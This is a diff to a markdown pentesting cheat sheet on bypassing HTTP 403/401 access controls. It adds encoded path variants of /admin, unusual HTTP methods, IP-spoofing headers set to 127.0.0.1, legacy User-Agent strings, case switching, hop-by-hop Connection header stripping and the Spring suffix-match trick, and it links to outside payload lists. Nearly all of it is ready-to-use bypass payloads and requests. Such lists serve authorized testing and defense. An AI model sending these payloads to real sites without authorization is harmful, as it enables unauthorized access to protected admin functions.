@@ -42,6 +42,21 @@ GET /admin; HTTP/1.1
 /admin%00
 /admin..;/
 /admin;/
+/%2e/admin
+/%252e/admin
+/../admin
+/.../admin
+/..%00/admin
+/..%01/admin
+/..%0a/admin
+/..%0d/admin
+/..%09/admin
+/~admin
+/%20/admin
+/%2e%2e/admin
+/%252e%252e/admin
+/%c0%af/admin
+/%e0%80%af/admin
 ```
 
 ### Path traversal prefix
@@ -77,6 +92,8 @@ DELETE /admin
 HEAD /admin
 OPTIONS /admin
 TRACE /admin
+CONNECT /admin
+FOO /admin    ← non-existent method, sometimes bypasses checks
 ```
 
 Override method via headers:
@@ -93,15 +110,26 @@ _method=GET
 ### IP spoofing headers
 ```
 X-Forwarded-For: 127.0.0.1
+X-Forward-For: 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+X-Forwarded-Proto: https
+X-Forwarded-Server: 127.0.0.1
 X-Real-IP: 127.0.0.1
-X-Originating-IP: 127.0.0.1
 X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Originating-IP: 127.0.0.1
 X-Client-IP: 127.0.0.1
 X-Host: 127.0.0.1
+X-Trusted-IP: 127.0.0.1
+X-Requested-By: 127.0.0.1
+X-Requested-For: 127.0.0.1
 Forwarded: for=127.0.0.1
+Via: 127.0.0.1
 True-Client-IP: 127.0.0.1
 CF-Connecting-IP: 127.0.0.1
 ```
+
+IP values to try: `127.0.0.1`, `127.0.0.1:80`, `127.0.0.1:443`, `localhost`, `10.0.0.1`, `172.16.0.0`
 
 ### Rewrite/proxy headers
 ```
@@ -195,9 +223,10 @@ Host: target.com
 
 ```
 # Try HTTP instead of HTTPS
-# Try HTTP/1.0
+# Try HTTP/1.0 (also try removing Host header entirely with 1.0)
 GET /admin HTTP/1.0
 
+# Try HTTP/0.9, 1.1, 2
 # Try different port
 https://target.com:8443/admin
 http://target.com:8080/admin
@@ -205,7 +234,63 @@ http://target.com:8080/admin
 
 ---
 
-## 8. Wordlists & Tools
+## 8. User-Agent Fuzzing
+
+Sometimes access controls differ by browser/OS. Try uncommon or legacy UAs:
+```
+Mozilla/5.0 (X11; Linux i686; U;rv: 1.7.13) Gecko/20070322 Kazehakase/0.4.4.1
+Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801
+Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01
+Googlebot/2.1 (+http://www.google.com/bot.html)
+```
+
+---
+
+## 9. Case Switching
+
+```
+/admin   → /Admin
+/admin   → /ADMIN
+/admin   → /aDmIn
+/user    → /User
+/user    → /%75ser    ← URL-encoded lowercase 'u'
+```
+
+---
+
+## 10. Hop-by-Hop Header Abuse
+
+Add sensitive headers to the `Connection` header to instruct proxies to strip them before forwarding. If an upstream proxy adds an auth/IP header that the backend trusts, stripping it may bypass the check:
+
+```
+GET /admin HTTP/1.1
+Host: target.com
+Connection: X-Forwarded-For
+X-Forwarded-For: 127.0.0.1
+```
+
+Headers worth trying in `Connection`:
+```
+X-Forwarded-For, X-Real-IP, Authorization, X-Auth-Token,
+Accept-Encoding, Transfer-Encoding, X-Custom-Auth
+```
+
+---
+
+## 11. Spring Framework Suffix Pattern (< 5.3)
+
+Versions before 5.3 have `useSuffixPatternMatch=true` by default. A route mapped to `/admin` also matches `/admin.*`:
+```
+/admin.json
+/admin.css
+/admin.html
+/admin.js
+/admin.anything
+```
+
+---
+
+## 12. Wordlists & Tools
 
 Reference payloads: https://github.com/jagat-singh-chaudhary/403-and-401-Bypass-Techniques/blob/main/Payloads
 HackTricks reference: https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/403-and-401-bypasses.html
